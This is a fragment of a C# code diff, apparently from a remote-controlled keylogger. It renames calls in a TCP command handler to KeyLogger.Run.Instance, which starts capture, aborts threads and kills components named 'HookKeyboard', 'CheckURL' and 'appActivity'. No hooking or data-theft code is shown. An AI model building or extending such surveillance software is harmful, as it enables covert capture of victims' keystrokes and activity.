@@ -38,7 +38,7 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.RunThread("run all");
+                            KeyLogger.Run.Instance.RunThread("run all");
                         }
                         catch (Exception a)
                         {
@@ -50,10 +50,10 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.thread.Abort();
-                            Run.Instance.thread1.Abort();
-                            Run.Instance.thread2.Abort();
-                            Run.Instance.threadtime.Abort();
+                            KeyLogger.Run.Instance.thread.Abort();
+                            KeyLogger.Run.Instance.thread1.Abort();
+                            KeyLogger.Run.Instance.thread2.Abort();
+                            KeyLogger.Run.Instance.threadtime.Abort();
                         }
                         catch (Exception kill)
                         {
@@ -65,7 +65,7 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.RunThread("kill appActivity");
+                            KeyLogger.Run.Instance.RunThread("kill appActivity");
                         }
                         catch (Exception s)
                         {
@@ -77,7 +77,7 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.RunThread("s1");
+                            KeyLogger.Run.Instance.RunThread("kill CheckURL");
                         }
                         catch (Exception b)
                         {
@@ -89,7 +89,7 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.RunThread("s2");
+                            KeyLogger.Run.Instance.RunThread("kill HookKeyboard");
                         }
                         catch (Exception c)
                         {
@@ -101,7 +101,7 @@ namespace key.TCPAcceptRequest
                     {
                         try
                         {
-                            Run.Instance.StartCapture(4000);
+                            KeyLogger.Run.Instance.StartCapture(4000);
                         }
                         catch (Exception e)
                         {
@@ -114,7 +114,7 @@ namespace key.TCPAcceptRequest
                         try
                         {
                             //TargetDesktop.Instance.StartTimer(0);
-                            Run.Instance.threadtime.Abort();
+                            KeyLogger.Run.Instance.threadtime.Abort();
                         }
                         catch (Exception t0)
                         {
